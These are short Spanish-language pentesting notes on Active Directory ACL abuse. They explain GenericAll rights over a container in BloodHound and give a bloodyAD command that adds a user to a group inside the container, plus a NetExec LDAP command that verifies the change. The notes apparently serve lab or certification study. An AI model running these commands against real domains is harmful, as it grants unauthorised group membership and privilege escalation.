# Abuso ACL

Tags: #AD #ACL #Linux 

## GenercilAll sobre un Contenedor  

* El icono en BloodHound, el **Container** aparece representado con el **icono de cuadritos** color naranja.
* El **Container** tiene los privilegios de 'Contener' uno o varios grupos.

```bash 
# Agregarse a un 'Grupo' por medio de un 'Container' 
❯ blodyad --host IP_DC -d domain.local -u user -p 'P@$$w0rd123!' add groupMember <Grupo> <Member>

	# Grupo = Es el grupo el cual esta dentro del contenedor 
	# Member = Usuario al cual se agregará al grupo 
```

```bash 
# Verificar si el miembro ha sido agregado al grupo 
❯ nxc ldap IP_DC -u user -p 'P@$$w0rd123!' --group <Grupo>

	# Grupo = Es el grupo el cual esta dentro del contenedor 
```